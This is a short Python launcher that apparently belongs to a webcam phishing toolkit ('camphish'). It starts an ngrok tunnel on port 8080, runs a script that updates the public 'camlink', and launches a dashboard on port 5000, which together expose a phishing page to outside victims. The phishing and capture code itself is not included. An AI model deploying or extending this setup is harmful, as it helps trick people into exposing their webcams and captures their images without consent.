import subprocess
import time
import threading

def run_ngrok():
    print("🚀 Starting ngrok tunnel on port 8080...")
    subprocess.run(["ngrok", "http", "8080"])

def run_camphish_updater():
    print("🔄 Running ngrok auto-update script...")
    subprocess.run(["python3", "auto_update_camlink.py"])

def run_dashboard():
    print("📊 Starting dashboard on port 5000...")
    subprocess.run(["python3", "dashboard.py"])

# Run ngrok in a thread
threading.Thread(target=run_ngrok).start()
time.sleep(5)  # Give ngrok time to initialize

# Run camlink updater
threading.Thread(target=run_camphish_updater).start()
time.sleep(5)

# Run dashboard
run_dashboard()
